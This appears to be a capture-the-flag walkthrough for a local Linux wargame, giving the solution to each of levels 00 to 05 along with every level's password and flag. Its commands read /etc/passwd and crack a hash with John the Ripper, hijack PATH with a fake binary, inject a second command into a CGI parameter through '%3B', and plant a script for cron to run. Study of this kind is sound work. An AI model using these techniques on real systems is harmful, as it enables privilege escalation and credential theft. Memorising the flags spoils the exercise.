@@ -1,0 +1,101 @@
+level00
+
+find / -user flag00 2>/dev/null
+/usr/sbin/john
+/rofs/usr/sbin/john
+
+cat /usr/sbin/john
+cdiiddwpgswtgt
+->15 nottoohardhere
+
+su flag00
+nottoohardhere
+
+flag = x24ti5gi3x0ol2eh4esiuxias
+
+su level01
+x24ti5gi3x0ol2eh4esiuxias
+
+level01
+
+cat /etc/passwd
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+john the ripper --> binary in resources
+scp -P 4243 level00@localhost:/etc/passwd level01/xxxxxx
+level01/resources/john level01/xxxxx --show
+flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
+
+1 password hash cracked, 0 left
+
+su flag01
+abcdefg
+
+flag = f2av5il02puano7naaf6adaaf
+
+su level02
+f2av5il02puano7naaf6adaaf
+
+level02
+
+scp -P 4243 level02@localhost:~/level02.pcap level02/xxxx
+
+su flag02
+ft_waNDReL0L
+
+flag = kooda2puivaav1idi4f57q8iq
+
+su level03
+kooda2puivaav1idi4f57q8iq
+
+level03
+
+scp -P 4243 level03@localhost:~/level03 level03/xxxx
+
+cd /var/tmp
+echo getflag > echo
+cd ~
+export PATH=/var/tmp:$PATH
+./level03
+
+flag = qi0maab88jeaj46qoumi7maus
+
+su level04
+qi0maab88jeaj46qoumi7maus
+
+level04
+
+curl "http://localhost:4747/level04.pl?x=%3Bwhoami"
+
+flag04
+
+./level04.pl x=`whoami`
+Content-type: text/html
+
+level04
+
+curl "http://localhost:4747/level04.pl?x=%3Bgetflag"
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+flag = ne2searoevaevoem4ov4ar8ap
+
+su level05
+ne2searoevaevoem4ov4ar8ap
+
+level05
+
+ls /var/mail
+echo "getflag > /var/tmp/test" > /opt/openarenaserver/test
+crontab /var/mail/level05
+
+flag = viuaaale9huek52boumoomioc
+
+su level06
+viuaaale9huek52boumoomioc
+
+level06
+
+
+
+
